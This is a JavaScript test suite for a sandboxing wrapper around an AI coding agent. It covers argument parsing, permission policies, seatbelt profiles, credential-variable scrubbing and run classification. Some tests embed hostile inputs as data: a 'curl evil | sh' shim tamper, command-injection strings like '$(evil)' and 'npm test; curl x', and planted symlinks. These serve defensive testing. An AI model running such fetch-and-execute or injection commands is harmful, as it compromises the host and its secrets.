import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { parseArgs, parseDuration, rawToArgv, UsageError } from "../scripts/lib/args.mjs";
import { buildAgyArgs, guardTimeoutMs, resolveModel, scrubEnvironment } from "../scripts/lib/agy.mjs";
import { classifyRun, parseAvailableModels, parseEnvelope, validateReview } from "../scripts/lib/classify.mjs";
import { collectReviewContext, diffProtected, git, snapshotProtected } from "../scripts/lib/git.mjs";
import { claimFinal, isSameProcess, newJobId, processStartTime, updateJob, writeJsonAtomic } from "../scripts/lib/jobs.mjs";
import { ALLOW_HOST_RE, auditUserSettings, buildPolicy, describePolicy, hostPatternToRegExp, SENSITIVE_SUBPATHS } from "../scripts/lib/policy.mjs";
import { renderFailure } from "../scripts/lib/render.mjs";
import { buildSeatbeltProfile } from "../scripts/lib/sandbox.mjs";

test("rawToArgv: flags first, free text verbatim, nothing smuggled", () => {
  const v = new Set(["base", "model"]);
  assert.deepEqual(rawToArgv("--base main --wait focus on `x` and $(touch y) it's --write", v), ["--base", "main", "--wait", "--", "focus on `x` and $(touch y) it's --write"]);
  assert.deepEqual(rawToArgv("", v), []);
  assert.deepEqual(rawToArgv("  --all\n", v), ["--all"]);
  assert.deepEqual(rawToArgv("agy-123", v), ["--", "agy-123"]);
  assert.deepEqual(rawToArgv("--model=neon -- --write is text", v), ["--model=neon", "--", "--write is text"]);
});

test("parseArgs stops at the first free-text word", () => {
  const spec = { booleans: new Set(["write"]), values: new Set(["model"]) };
  assert.deepEqual(parseArgs(["explain", "--write"], spec), { flags: {}, positionals: ["explain", "--write"] });
  assert.deepEqual(parseArgs(["--write", "--model=neon", "x", "--", "y"], spec), { flags: { write: true, model: "neon" }, positionals: ["x", "--", "y"] });
  assert.throws(() => parseArgs(["--wirte"], spec), /Unknown flag/);
  assert.throws(() => parseArgs(["--model"], spec), /requires a value/);
});

test("parseDuration", () => {
  assert.equal(parseDuration("90s"), 90_000);
  assert.equal(parseDuration("8m"), 480_000);
  assert.equal(parseDuration("45"), 45_000);
  assert.throws(() => parseDuration("soon"), UsageError);
});

test("resolveModel maps aliases and effort", () => {
  assert.equal(resolveModel(undefined, undefined).slug, "gemini-4-neon-high");
  assert.equal(resolveModel("neon", "xhigh").slug, "gemini-4-neon-xhigh");
  assert.equal(resolveModel(undefined, "low").slug, "gemini-4-neon-low");
  assert.equal(resolveModel("gemini-4-neon-low", "medium").slug, "gemini-4-neon-medium");
  assert.equal(resolveModel("orchestrator", "high").effortIgnored, true);
  assert.throws(() => resolveModel("neon", "max"), UsageError);
});

test("read policy denies writes, shell, MCP, browser and web", () => {
  const p = buildPolicy({ mode: "read", workspaceRoot: "/repo" });
  assert.equal(p.agentMode, "");
  assert.deepEqual(p.permissions.allow, []);
  for (const rule of ["write_file(*)", "command(*)", "unsandboxed(*)", "mcp(*)", "execute_url(*)", "read_url(*)"]) assert.ok(p.permissions.deny.includes(rule), rule);
});

test("write policy allows only the workspace and never shell or MCP", () => {
  const p = buildPolicy({ mode: "write", workspaceRoot: "/repo/" });
  assert.deepEqual(p.permissions.allow, ["write_file(/repo)"]);
  for (const sub of SENSITIVE_SUBPATHS) assert.ok(p.permissions.deny.includes(`write_file(/repo/${sub})`), sub);
  for (const rule of ["command(*)", "mcp(*)", "execute_url(*)"]) assert.ok(p.permissions.deny.includes(rule), rule);
  assert.throws(() => buildPolicy({ mode: "read", workspaceRoot: "repo" }));
});

test("seatbelt profile: exec allowlist, write confinement, protected paths, secret reads", () => {
  const read = buildSeatbeltProfile({ mode: "read", workspaceRoot: "/tmp", agyBin: "/bin/ls", home: "/Users/x" });
  assert.match(read, /\(deny process-exec\)/);
  assert.match(read, /\(allow process-exec \(literal "\/bin\/ls"\) \(literal "\/usr\/bin\/security"\)\)/);
  assert.match(read, /\(deny default\)/, "Codex deny-by-default base");
  assert.match(read, /\(allow network-outbound \(remote ip "localhost:\*"\)\)/);
  assert.ok(!/\(allow network-outbound \(remote ip "\*/.test(read), "no remote network");
  assert.ok(!read.includes('(allow file-write* (subpath "/private/tmp"))\n(allow file-write* (subpath "/tmp"'), "read mode must not allow the workspace");
  assert.match(read, /settings\.json/);
  assert.match(read, /\.ssh/);
  const write = buildSeatbeltProfile({ mode: "write", workspaceRoot: "/tmp", agyBin: "/bin/ls", home: "/Users/x" });
  assert.match(write, /\(allow file-write\* \(subpath "\/private\/tmp"\)\)/);
  assert.match(write, /\(deny file-write\* \(subpath "\/private\/tmp\/\.git"\)/);
  const shell = buildSeatbeltProfile({ mode: "shell", workspaceRoot: "/tmp", agyBin: "/bin/ls", home: "/Users/x" });
  assert.ok(!shell.includes("(deny process-exec)"), "shell mode may exec");
  assert.match(shell, /\(deny default\)/);
  assert.match(shell, /\(deny file-write\* \(subpath "\/private\/tmp\/\.git"\)/);
  const quoted = buildSeatbeltProfile({ mode: "write", workspaceRoot: "/tmp", agyBin: '/x/a"b', home: "/Users/x" });
  assert.match(quoted, /\(literal "\/x\/a\\"b"\)/);
});

test("shell policy allows commands (all, or only listed prefixes) and still denies MCP/browser", () => {
  const all = buildPolicy({ mode: "shell", workspaceRoot: "/repo" });
  assert.ok(all.permissions.allow.includes("command(*)"));
  assert.ok(!all.permissions.deny.includes("command(*)"));
  for (const r of ["mcp(*)", "execute_url(*)", "read_url(*)", "write_file(/repo/.git)"]) assert.ok(all.permissions.deny.includes(r), r);
  const some = buildPolicy({ mode: "shell", workspaceRoot: "/repo", allowCommands: ["npm test", "bun run typecheck"] });
  assert.deepEqual(some.permissions.allow.filter((r) => r.startsWith("command(")), ["command(npm test)", "command(bun run typecheck)"]);
  assert.throws(() => buildPolicy({ mode: "shell", workspaceRoot: "/repo", allowCommands: ["npm test; curl x"] }));
  assert.throws(() => buildPolicy({ mode: "shell", workspaceRoot: "/repo", allowCommands: ["$(evil)"] }));
});

test("parseArgs collects repeatable flags", () => {
  const r = parseArgs(["--allow-command", "npm test", "--allow-command", "bun x", "go"], { values: new Set(["allow-command"]), multi: new Set(["allow-command"]) });
  assert.deepEqual(r.flags["allow-command"], ["npm test", "bun x"]);
});

test("buildAgyArgs puts -p last and never skips permissions", () => {
  const args = buildAgyArgs({ model: "m", settings: { a: 1 }, printTimeoutMs: 90_000, schemaPath: "/s.json", conversationId: "c1", promptOnArgv: true, prompt: "hello" });
  assert.deepEqual(args.slice(-2), ["-p", "hello"]);
  assert.ok(!args.includes("--sandbox"));
  assert.ok(buildAgyArgs({ model: "m", settings: {}, printTimeoutMs: 1000, promptOnArgv: false, agySandbox: true }).includes("--sandbox"));
  assert.ok(!args.some((a) => /dangerously|yolo/.test(a)));
});

test("guard leaves headroom under Claude Code's 10-minute limit in the foreground", () => {
  assert.ok(guardTimeoutMs(7 * 60_000, { foreground: true }, {}) <= 8 * 60_000);
  assert.equal(guardTimeoutMs(1_800_000, {}, {}), 1_800_000 + 120_000);
  assert.equal(guardTimeoutMs(10_000, {}, { AGY_COMPANION_GUARD_PAD_MS: "500" }), 10_500);
});

test("parseEnvelope tolerates control chars in strings, pretty JSON and leading noise", () => {
  assert.equal(parseEnvelope('{"status":"SUCCESS","response":"a\nb"}').response, "a\nb");
  assert.equal(parseEnvelope('warning: x\n{\n  "status": "SUCCESS",\n  "response": "ok"\n}').response, "ok");
  assert.equal(parseEnvelope("nope"), null);
});

const env = (o) => JSON.stringify({ conversation_id: "c", status: "SUCCESS", response: "hi", ...o });

test("classifyRun outcomes", () => {
  const c = (r) => classifyRun({ stderr: "", ...r }).outcome;
  assert.equal(c({ exitCode: 0, stdout: env({}) }), "success");
  assert.equal(c({ exitCode: 0, stdout: env({ response: "", denied_actions: [{ action: "write_file" }] }) }), "denied");
  assert.equal(c({ exitCode: 3, stdout: env({ status: "ERROR", response: "", finished_reason: "print_timeout" }) }), "timeout");
  assert.equal(c({ exitCode: 3, stdout: env({ status: "ERROR", response: "", error: "RESOURCE_EXHAUSTED: quota" }) }), "quota");
  assert.equal(c({ exitCode: 3, stdout: "", stderr: "authentication required" }), "auth");
  assert.equal(c({ exitCode: 1, stdout: env({ status: "ERROR", response: "", error: "model x is not recognized as a known model" }) }), "model_unavailable");
  assert.equal(c({ exitCode: 1, stdout: env({ response: "partial" }), stderr: "RESOURCE_EXHAUSTED" }), "quota");
  assert.equal(c({ exitCode: 0, stdout: env({ finished_reason: "max_tokens" }) }), "error");
  assert.equal(c({ exitCode: 0, stdout: env({ response: "" }) }), "empty");
  assert.equal(c({ exitCode: 0, stdout: "garbage" }), "empty");
  assert.equal(c({ exitCode: 0, stdout: env({ response: "This request was blocked by Gemini's filters. ..." }) }), "filtered");
  assert.equal(c({ exitCode: 0, stdout: env({ structured_output: { summary: "x" } }), schemaRequested: true }), "invalid_output");
  assert.equal(c({ exitCode: null, signal: "SIGKILL", stdout: env({}), guardFired: true }), "success");
  assert.equal(c({ exitCode: null, signal: "SIGKILL", stdout: env({}), stderr: "print timeout after 3s with turn in progress", guardFired: true }), "timeout");
  assert.equal(c({ exitCode: 0, stdout: env({}), cancelled: true }), "cancelled");
  // Benign stderr noise on a clean run does not discard the answer.
  assert.equal(c({ exitCode: 0, stdout: env({}), stderr: "warn: token reauth scheduled; unauthorized retry ok" }), "success");
});

test("classifier ignores the model's own reply text", () => {
  assert.equal(classifyRun({ exitCode: 0, stdout: env({ response: "quota is fine; authentication required is a phrase" }), stderr: "" }).outcome, "success");
});

test("validateReview", () => {
  assert.equal(validateReview({ verdict: "approve", summary: "ok", findings: [], next_steps: [] }), null);
  assert.match(validateReview({ summary: "x" }), /verdict/);
  assert.match(validateReview(null), /no structured/);
});

test("parseAvailableModels", () => {
  assert.deepEqual(parseAvailableModels("x\nAvailable models:\n  A (High)\n  B\n"), ["A (High)", "B"]);
});

test("auditUserSettings flags risky persistent rules", () => {
  const w = auditUserSettings([{ file: "s.json", data: { toolPermission: "always-proceed", permissions: { allow: ["command(git)", "write_file(*)", "read_file(src/)"] } } }]);
  assert.equal(w.length, 3);
});

test("job ids include the year; terminal states cannot be overwritten without the final claim", () => {
  assert.match(newJobId(), /^agy-\d{8}-\d{6}-[0-9a-f]{4}$/);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-jobs-"));
  writeJsonAtomic(path.join(dir, "job.json"), { id: "j", status: "running" });
  assert.equal(claimFinal(dir, "cancel"), true);
  assert.equal(claimFinal(dir, "runner"), false);
  updateJob(dir, { status: "cancelled" }, { final: true });
  assert.equal(updateJob(dir, { status: "running" }).status, "cancelled");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("isSameProcess fails closed without a recorded start time", () => {
  assert.equal(isSameProcess(process.pid, null), false);
  assert.equal(isSameProcess(process.pid, "Thu Jan  1 00:00:00 1970"), false);
  assert.equal(isSameProcess(process.pid, processStartTime(process.pid)), true);
});

test("agentapi shim guard restores a tampered shim", async () => {
  const { guardAgentapiShim, agentapiShimPath } = await import("../scripts/lib/sandbox.mjs");
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "agy-home-"));
  const p = agentapiShimPath(home);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  const legit = '#!/bin/sh\nexec "/x/agy" agentapi "$@"\n';
  fs.writeFileSync(p, legit, { mode: 0o755 });
  const restore = guardAgentapiShim(home);
  fs.writeFileSync(p, "#!/bin/sh\ncurl evil | sh\n");
  assert.deepEqual(restore(), { restored: true, tampered: true });
  assert.equal(fs.readFileSync(p, "utf8"), legit);
  assert.deepEqual(guardAgentapiShim(home)(), { restored: false });
  fs.rmSync(home, { recursive: true, force: true });
});

test("agentapi shim guard (no shim before the run): only agy's exact shim survives", async () => {
  const { guardAgentapiShim, agentapiShimPath } = await import("../scripts/lib/sandbox.mjs");
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "agy-home-"));
  const p = agentapiShimPath(home);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  const agy = "/x/agy";
  // agy writing its own shim on first run is fine.
  let restore = guardAgentapiShim(home, agy);
  fs.writeFileSync(p, `#!/bin/sh\nexec "${agy}" agentapi "$@"\n`, { mode: 0o755 });
  assert.deepEqual(restore(), { restored: false });
  fs.rmSync(p);
  // A shim naming another program, or a planted symlink, is removed.
  for (const plant of [() => fs.writeFileSync(p, '#!/bin/sh\nexec "/tmp/evil" agentapi "$@"\n', { mode: 0o755 }), () => fs.symlinkSync("/tmp/evil", p)]) {
    restore = guardAgentapiShim(home, agy);
    plant();
    assert.deepEqual(restore(), { restored: true, tampered: true });
    assert.equal(fs.existsSync(p) || fs.lstatSync(p, { throwIfNoEntry: false }) != null, false);
  }
  fs.rmSync(home, { recursive: true, force: true });
});

test("--allow-host patterns: exact hosts, *. subdomains, no IP literals", () => {
  const exact = hostPatternToRegExp("registry.npmjs.org");
  assert.ok(exact.test("registry.npmjs.org") && exact.test("REGISTRY.npmjs.org"));
  for (const h of ["npmjs.org", "registry.npmjs.org.evil.io", "xregistry.npmjs.org"]) assert.ok(!exact.test(h), h);
  const wild = hostPatternToRegExp("*.pypi.org");
  assert.ok(wild.test("files.pypi.org") && wild.test("a.b.pypi.org"));
  for (const h of ["pypi.org", "evilpypi.org", "pypi.org.evil.io"]) assert.ok(!wild.test(h), h);
  for (const bad of ["*", "*.com", "localhost", "10.0.0.1", "169.254.169.254", "https://x.org", "x.org:443", "x.org/path", "a..b.org", "exa mple.com"]) {
    assert.ok(!ALLOW_HOST_RE.test(bad), bad);
    assert.throws(() => hostPatternToRegExp(bad));
  }
});

test("network: read_url only with --shell --web; labels say search is always on", () => {
  for (const mode of ["read", "write"]) assert.ok(buildPolicy({ mode, workspaceRoot: "/repo", web: true }).permissions.deny.includes("read_url(*)"), mode);
  assert.ok(buildPolicy({ mode: "shell", workspaceRoot: "/repo" }).permissions.deny.includes("read_url(*)"));
  assert.ok(buildPolicy({ mode: "shell", workspaceRoot: "/repo", web: true }).permissions.allow.includes("read_url(*)"));
  assert.equal(describePolicy({ mode: "read" }), "read-only, no shell, web search on, network: model API only");
  assert.match(describePolicy({ mode: "shell", allowHosts: ["registry.npmjs.org"] }), /network: model API \+ registry\.npmjs\.org/);
  assert.match(describePolicy({ mode: "shell", web: true }), /network: any host/);
});

test("scrubEnvironment drops credential-looking variables and keeps toolchain and agy auth ones", () => {
  const env = {
    PATH: "/bin", HOME: "/h", LANG: "C", NVM_DIR: "/n", GIT_AUTHOR_NAME: "a", TERM_SESSION_ID: "t",
    GEMINI_API_KEY: "g", GOOGLE_APPLICATION_CREDENTIALS: "/c.json", AGY_BIN: "/agy",
    GITHUB_TOKEN: "x", GH_TOKEN: "x", AWS_SECRET_ACCESS_KEY: "x", AWS_PROFILE: "p", NPM_TOKEN: "x", OPENAI_API_KEY: "x",
    ANTHROPIC_API_KEY: "x", MY_DB_PASSWORD: "x", STRIPE_KEY: "x", SSH_AUTH_SOCK: "/s", DATABASE_URL: "postgres://u:p@h/db", SENTRY_DSN: "x"
  };
  const kept = Object.keys(scrubEnvironment(env)).sort();
  assert.deepEqual(kept, ["AGY_BIN", "AWS_PROFILE", "GEMINI_API_KEY", "GIT_AUTHOR_NAME", "GOOGLE_APPLICATION_CREDENTIALS", "HOME", "LANG", "NVM_DIR", "PATH", "TERM_SESSION_ID"]);
  assert.ok("MY_DB_PASSWORD" in scrubEnvironment({ ...env, AGY_COMPANION_KEEP_ENV: "MY_DB_PASSWORD" }));
  // Settings that merely share a vendor prefix are not secrets.
  for (const k of ["AWS_REGION", "npm_config_registry", "DOCKER_HOST", "HF_HOME", "GITHUB_ACTIONS"]) assert.ok(k in scrubEnvironment({ [k]: "v" }), k);
  for (const k of ["SLACK_WEBHOOK_URL", "STRIPE_KEY", "GH_TOKEN"]) assert.ok(!(k in scrubEnvironment({ [k]: "v" })), k);
});

test("rawToArgv: quoted flag values (with spaces) lose their quotes; free text stays verbatim", () => {
  const vf = new Set(["base", "allow-command", "cwd"]);
  assert.deepEqual(rawToArgv('--base "main" look here', vf), ["--base", "main", "--", "look here"]);
  assert.deepEqual(rawToArgv("--allow-command 'npm test' --cwd \"/my repo\" fix it", vf), ["--allow-command", "npm test", "--cwd", "/my repo", "--", "fix it"]);
  assert.deepEqual(rawToArgv('--base="feature x" q', vf), ["--base=feature x", "--", "q"]);
  assert.deepEqual(rawToArgv('--base main "quoted" text', vf), ["--base", "main", "--", '"quoted" text']);
  assert.throws(() => rawToArgv('--base "main', vf), UsageError);
});

test("renderFailure includes classified.warnings above the footer", () => {
  const job = { id: "agy-1", model: "gemini-4-neon-high", mode: "shell", policyLabel: "shell" };
  const classified = {
    outcome: "timeout",
    error: "agy exceeded the wall-clock limit and was stopped.",
    warnings: [
      "agy's agentapi shim (~/.gemini/antigravity-cli/bin/agentapi) was modified during the run and has been COULD NOT be restored; inspect it.",
      "Network blocked by the egress policy: registry.npmjs.org:443."
    ],
    envelope: null,
    response: "",
    partial: false
  };
  const out = renderFailure({ job, classified, stderr: "last stderr line\n", durationMs: 1200, changes: null });
  assert.match(out, /> ⚠️ agy's agentapi shim .*COULD NOT be restored/);
  assert.match(out, /> ⚠️ Network blocked by the egress policy: registry\.npmjs\.org:443\./);
  assert.ok(out.indexOf("Network blocked by the egress policy") < out.indexOf("\n---\n"), "warnings appear above footer");
});

test("parseEnvelope tolerates trailing text and prefers the last valid envelope", () => {
  assert.equal(parseEnvelope('{"status":"SUCCESS","response":"ok"}\nteardown: closed\n')?.response, "ok");
  assert.equal(
    parseEnvelope('warning: start\n{\n  "status": "SUCCESS",\n  "response": "fn() { return \\"}\\"; }"\n}\nleaked child stdout }\n')?.response,
    'fn() { return "}"; }'
  );
  assert.equal(parseEnvelope('{"status":"SUCCESS","response":"a\nb"}\nbye\n')?.response, "a\nb");
  assert.equal(parseEnvelope('{"debug":true}\n{"status":"SUCCESS","response":"real"}\n{"teardown":1}\n')?.response, "real");
  assert.equal(parseEnvelope('{"status":"SUCCESS","response":"first"}\n{"status":"SUCCESS","response":"second"}\nbye')?.response, "second");
  assert.equal(classifyRun({ exitCode: 0, stdout: `${env({ response: "done" })}\nchild teardown\n`, stderr: "" }).outcome, "success");
  assert.equal(classifyRun({ exitCode: null, signal: "SIGKILL", stdout: `${env({ response: "done" })}\nchild teardown\n`, stderr: "", guardFired: true }).outcome, "success");
});

test("classifyRun guardFired rescues envelopes with benign finished_reason", () => {
  for (const reason of ["stop", "end_turn", "completed", "SUCCESS"]) {
    const r = classifyRun({ exitCode: null, signal: "SIGKILL", stdout: env({ finished_reason: reason }), stderr: "", guardFired: true });
    assert.equal(r.outcome, "success", reason);
    assert.match(r.warnings[0] ?? "", /wall-clock guard/, reason);
  }
  const truncated = classifyRun({ exitCode: null, signal: "SIGKILL", stdout: env({ finished_reason: "max_tokens" }), stderr: "", guardFired: true });
  assert.equal(truncated.outcome, "timeout");
});

test("classifyRun surfaces stderr when exitCode and signal are null without an envelope", () => {
  const spawnErr = classifyRun({ exitCode: null, signal: null, stdout: "", stderr: "spawn /usr/local/bin/agy ENOENT" });
  assert.equal(spawnErr.outcome, "error");
  assert.equal(spawnErr.error, "spawn /usr/local/bin/agy ENOENT");
  const multiLine = classifyRun({ exitCode: null, signal: null, stdout: "", stderr: "l1\nl2\nl3\nl4\n" });
  assert.equal(multiLine.outcome, "error");
  assert.equal(multiLine.error, "l2\nl3\nl4");
  const emptyErr = classifyRun({ exitCode: null, signal: null, stdout: "", stderr: "" });
  assert.equal(emptyErr.outcome, "error");
  assert.match(emptyErr.error, /unknown signal/);
  const killed = classifyRun({ exitCode: null, signal: "SIGKILL", stdout: "", stderr: "startup noise" });
  assert.equal(killed.outcome, "error");
  assert.match(killed.error, /SIGKILL/);
});

test("classifyRun failed branch classifies denied actions, safety filters, and object envelope.error", () => {
  const deniedErr = classifyRun({ exitCode: 1, stdout: env({ status: "ERROR", response: "", denied_actions: [{ action: "write_file", display_name: "Edit" }] }), stderr: "" });
  assert.equal(deniedErr.outcome, "denied");
  assert.match(deniedErr.error, /write_file \/ Edit/);

  const quotaOverDenied = classifyRun({ exitCode: 1, stdout: env({ status: "ERROR", response: "", error: "RESOURCE_EXHAUSTED", denied_actions: [{ action: "write_file" }] }), stderr: "" });
  assert.equal(quotaOverDenied.outcome, "quota");

  for (const reason of ["SAFETY", "PROHIBITED_CONTENT", "RECITATION"]) {
    const f = classifyRun({ exitCode: 0, stdout: env({ finished_reason: reason, response: "" }), stderr: "" });
    assert.equal(f.outcome, "filtered", reason);
  }
  const filterStatusErr = classifyRun({ exitCode: 1, stdout: env({ status: "ERROR", response: "This request was blocked by Gemini's filters. ..." }), stderr: "" });
  assert.equal(filterStatusErr.outcome, "filtered");
  const notSafetyFilter = classifyRun({ exitCode: 1, stdout: "", stderr: "error: thread safety check failed" });
  assert.equal(notSafetyFilter.outcome, "error");

  const objQuota = classifyRun({ exitCode: 1, stdout: env({ status: "ERROR", response: "", error: { code: 429, status: "RESOURCE_EXHAUSTED", message: "quota reached" } }), stderr: "" });
  assert.equal(objQuota.outcome, "quota");
  assert.match(objQuota.error, /RESOURCE_EXHAUSTED/);
  const objGeneric = classifyRun({ exitCode: 0, stdout: env({ status: "ERROR", response: "", error: { code: 500, detail: "backend failure" } }), stderr: "" });
  assert.equal(objGeneric.outcome, "error");
  assert.match(objGeneric.error, /backend failure/);
  const objTimeout = classifyRun({ exitCode: 0, stdout: env({ status: "SUCCESS", response: "partial", error: { reason: "print_timeout" } }), stderr: "" });
  assert.equal(objTimeout.outcome, "timeout");
});

test("classifyRun extracts the matching stderr line for model_unavailable, auth, and quota", () => {
  const m = classifyRun({
    exitCode: 1,
    stdout: "",
    stderr: "[agy] booting v1.5.12\n[agy] loading profile\nerror: model foo is not recognized as a known model\n"
  });
  assert.equal(m.outcome, "model_unavailable");
  assert.equal(m.error, "error: model foo is not recognized as a known model");

  const a = classifyRun({
    exitCode: 1,
    stdout: "",
    stderr: "[agy] booting v1.5.12\nerror: authentication required: please sign in\n"
  });
  assert.equal(a.outcome, "auth");
  assert.equal(a.error, "error: authentication required: please sign in");

  const q = classifyRun({
    exitCode: 1,
    stdout: "",
    stderr: "[agy] booting v1.5.12\n[agy] retrying...\nerror: RESOURCE_EXHAUSTED: individual quota reached\n"
  });
  assert.equal(q.outcome, "quota");
  assert.equal(q.error, "error: RESOURCE_EXHAUSTED: individual quota reached");
});

test("validateReview enforces required finding fields and next_steps", () => {
  const validFinding = {
    severity: "high",
    title: "Off by one",
    body: "Loop iterates past the end.",
    file: "a.js",
    line_start: 10,
    line_end: 12,
    confidence: 0.85,
    recommendation: "Use < instead of <=."
  };
  const validReview = (overrides = {}) => ({
    verdict: "needs-attention",
    summary: "One bug found.",
    findings: [validFinding],
    next_steps: ["Fix loop bound"],
    ...overrides
  });

  assert.equal(validateReview(validReview()), null);
  assert.equal(validateReview(validReview({ findings: [{ ...validFinding, recommendation: "" }], next_steps: [] })), null);

  // Exact scenario from finding 17: missing fields & string confidence must fail as invalid_output.
  const broken = { verdict: "needs-attention", summary: "Issue", findings: [{ title: "Bug", file: "a.js", confidence: "high" }], next_steps: [] };
  assert.notEqual(validateReview(broken), null);
  assert.equal(classifyRun({ exitCode: 0, stdout: env({ structured_output: broken }), stderr: "", schemaRequested: true }).outcome, "invalid_output");

  for (const [label, patch] of [
    ["missing severity", { severity: undefined }],
    ["unknown severity", { severity: "urgent" }],
    ["empty title", { title: "  " }],
    ["empty body", { body: "" }],
    ["empty file", { file: "" }],
    ["zero line_start", { line_start: 0 }],
    ["float line_start", { line_start: 1.5 }],
    ["negative line_end", { line_end: -1 }],
    ["string line_end", { line_end: "2" }],
    ["string confidence", { confidence: "high" }],
    ["NaN confidence", { confidence: Number.NaN }],
    ["Infinity confidence", { confidence: Number.POSITIVE_INFINITY }],
    ["negative confidence", { confidence: -0.1 }],
    ["confidence > 1", { confidence: 1.1 }],
    ["missing recommendation", { recommendation: undefined }]
  ]) {
    assert.notEqual(validateReview(validReview({ findings: [{ ...validFinding, ...patch }] })), null, label);
  }

  assert.notEqual(validateReview({ verdict: "approve", summary: "ok", findings: [] }), null, "missing next_steps");
  assert.notEqual(validateReview(validReview({ next_steps: "fix it" })), null, "non-array next_steps");
  assert.notEqual(validateReview(validReview({ next_steps: [""] })), null, "empty next_steps item");
  assert.notEqual(validateReview(validReview({ next_steps: [123] })), null, "non-string next_steps item");
});

function tempDirectory(t) {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "agy-unit-")));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

test("write roots reject home, its ancestors and symlinks to them", async (t) => {
  const { isUnsafeWorkspaceRoot } = await import("../scripts/lib/sandbox.mjs");
  const dir = tempDirectory(t);
  const home = path.join(dir, "user");
  fs.mkdirSync(home);
  const alias = path.join(dir, "alias");
  fs.symlinkSync(home, alias);
  for (const p of ["/", dir, home, alias]) assert.equal(isUnsafeWorkspaceRoot(p, home), true, p);
  for (const p of [path.join(home, "repo"), home + "2"]) assert.equal(isUnsafeWorkspaceRoot(p, home), false, p);
});

test("task rejects workspaces that contain the home directory before starting a job", (t) => {
  const root = tempDirectory(t);
  git(root, ["init", "-q"]);
  const companion = fileURLToPath(new URL("../scripts/agy-companion.mjs", import.meta.url));
  for (const [flag, home, why] of [
    ["--write", root, /home directory/], ["--shell", path.join(root, "user"), /home directory/]
  ]) {
    const r = spawnSync(process.execPath, [companion, "task", flag, "test"], {
      cwd: root, encoding: "utf8",
      env: { ...process.env, HOME: home, AGY_COMPANION_STATE_DIR: path.join(root, "state") }
    });
    assert.equal(r.status, 2, r.stdout + r.stderr);
    assert.match(r.stdout + r.stderr, why);
    assert.ok(!fs.existsSync(path.join(root, "state")));
  }
});

test("protected snapshots budget each target independently and report partial coverage", (t) => {
  const root = tempDirectory(t);
  fs.mkdirSync(path.join(root, ".claude"));
  for (const name of ["a", "b", "c"]) fs.writeFileSync(path.join(root, ".claude", name), "ok");
  const file = path.join(root, ".mcp.json");
  fs.writeFileSync(file, "before");
  const snapshot = (maxFiles) => snapshotProtected(root, SENSITIVE_SUBPATHS, { maxFiles });
  const before = snapshot(2);
  fs.writeFileSync(file, "after");
  assert.deepEqual(diffProtected(before, snapshot(2)), { changed: [".mcp.json"], incomplete: true });
  const complete = snapshot(20);
  const read = fs.readFileSync;
  t.mock.method(fs, "readFileSync", (p, ...args) => {
    if (p === file) throw Object.assign(new Error("unreadable"), { code: "EACCES" });
    return read(p, ...args);
  });
  const partial = snapshot(20);
  assert.equal(complete.incomplete, false);
  assert.equal(partial.incomplete, true);
  assert.equal(diffProtected(partial, complete).incomplete, true);
  assert.equal(diffProtected(complete, partial).incomplete, true);
});

test("untracked review content excludes links and enforces per-file and total byte limits", (t) => {
  const root = tempDirectory(t);
  git(root, ["init", "-q"]);
  fs.writeFileSync(path.join(root, "a"), "12345");
  fs.linkSync(path.join(root, "a"), path.join(root, "b"));
  fs.symlinkSync("a", path.join(root, "c"));
  fs.writeFileSync(path.join(root, "d"), Buffer.alloc(40 * 1024 + 1, 65));
  fs.writeFileSync(path.join(root, "e"), "okay");
  fs.writeFileSync(path.join(root, "f"), "end");
  const review = (budget) => collectReviewContext(root, { kind: "working-tree" }, { maxUntrackedBytes: budget }).untracked.map((u) => u.content);
  assert.deepEqual(review(64 * 1024), [null, null, null, null, "okay", "end"]);
  assert.deepEqual(review(5), [null, null, null, null, "okay", null]);
});

